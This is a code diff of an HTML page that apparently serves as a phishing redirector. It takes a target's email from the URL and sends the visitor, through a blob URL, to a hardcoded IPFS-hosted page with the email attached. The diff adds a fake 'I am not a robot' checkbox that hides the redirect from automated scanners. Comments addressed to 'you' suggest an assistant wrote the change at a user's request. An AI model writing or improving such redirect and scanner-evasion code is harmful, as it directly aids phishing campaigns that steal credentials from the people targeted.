@@ -1,27 +1,113 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Blob IPFS Redirect</title>
+    <title>Blob IPFS Redirect + Anti-Bot</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+
+<style>
+html, body {
+    margin:0; padding:0; width:100%; height:100%;
+    font-family: Arial, sans-serif;
+}
+
+/* Overlay */
+#overlay {
+    position:fixed;
+    top:0; left:0;
+    width:100%; height:100%;
+    background:#f0f2f5;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    opacity:0;
+    transition:0.3s;
+    z-index:9999;
+}
+
+#verificationBox {
+    background:#fff;
+    padding:25px 30px;
+    border-radius:8px;
+    width:300px;
+    box-shadow:0 5px 20px rgba(0,0,0,0.15);
+    border:1px solid #ddd;
+    text-align:left;
+}
+
+#checkbox {
+    width:26px; height:26px;
+    border:2px solid #7f8fa6;
+    border-radius:4px;
+    cursor:pointer;
+    transition:0.3s;
+}
+
+#robotIcon {
+    width:32px; height:32px;
+    background:#e8f0fe;
+    border-radius:50%;
+    font-size:20px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+}
+
+#verifying {
+    display:none;
+    margin-top:15px;
+    font-size:14px;
+    color:#555;
+}
+
+.spinner {
+    width:16px; height:16px;
+    border-radius:50%;
+    border:3px solid #40739e;
+    border-top-color:transparent;
+    animation:spin 0.6s linear infinite;
+}
+
+@keyframes spin {
+    from {transform:rotate(0deg);}
+    to {transform:rotate(360deg);}
+}
+</style>
 </head>
-<body style="margin:0; padding:0;">
+<body>
+
+<!-- Anti-bot UI -->
+<div id="overlay">
+    <div id="verificationBox">
+        <div style="display:flex; align-items:center; gap:12px;">
+            <div id="robotIcon">🤖</div>
+            <strong style="flex:1;font-size:15px;">I am not a robot</strong>
+            <div id="checkbox"></div>
+        </div>
+
+        <div id="verifying">
+            <div style="display:flex; align-items:center; gap:5px;">
+                <div class="spinner"></div> Verifying…
+            </div>
+        </div>
+    </div>
+</div>
 
 <script>
-// Base IPFS URL
+// ----------------------------------------------
+// YOUR ORIGINAL BLOB SCRIPT (unchanged)
+// ----------------------------------------------
+
 const BASE_IPFS = "https://bafkreihy4f7rhfkkwwb6zyz6kzdb25sact4uw3e5xk2ogsweommzcyccpq.ipfs.dweb.link/";
 
-// Get email parameter from ?email=
 function getEmail() {
     const params = new URLSearchParams(location.search);
     return params.get("email") || "";
 }
 
-// Build final IPFS URL with #email hash
 function buildIPFS(email) {
     return email ? BASE_IPFS + "#" + email : BASE_IPFS;
 }
 
-// Create Blob HTML
 function createBlobHTML(url) {
     return `
         <!DOCTYPE html>
@@ -54,17 +140,51 @@ function createBlobHTML(url) {
     `;
 }
 
-// MAIN
-document.addEventListener("DOMContentLoaded", () => {
+// ----------------------------------------------
+// HUMAN VERIFICATION (added)
+// ----------------------------------------------
+
+function requireVerification() {
+    return new Promise(resolve => {
+        const overlay = document.getElementById("overlay");
+        const checkbox = document.getElementById("checkbox");
+        const verifying = document.getElementById("verifying");
+
+        // Fade in overlay
+        overlay.style.opacity = 1;
+
+        // User clicks checkbox
+        checkbox.onclick = () => {
+            checkbox.style.background = "#40739e";
+            checkbox.style.borderColor = "#40739e";
+            verifying.style.display = "block";
+
+            setTimeout(() => {
+                overlay.style.opacity = 0;
+                setTimeout(() => overlay.remove(), 300);
+                resolve(true);
+            }, 1200);
+        };
+    });
+}
+
+// ----------------------------------------------
+// MAIN (runs after human verification)
+// ----------------------------------------------
+
+document.addEventListener("DOMContentLoaded", async () => {
+
+    // Wait for user to verify they are human
+    await requireVerification();
+
+    // Continue with your original blob redirect
     const email = getEmail();
     const ipfsURL = buildIPFS(email);
 
     const blobHTML = createBlobHTML(ipfsURL);
-
     const blob = new Blob([blobHTML], { type: "text/html" });
     const blobURL = URL.createObjectURL(blob);
 
-    // Mobile-safe: use location.href instead of iframe injection
     window.location.href = blobURL;
 });
 </script>
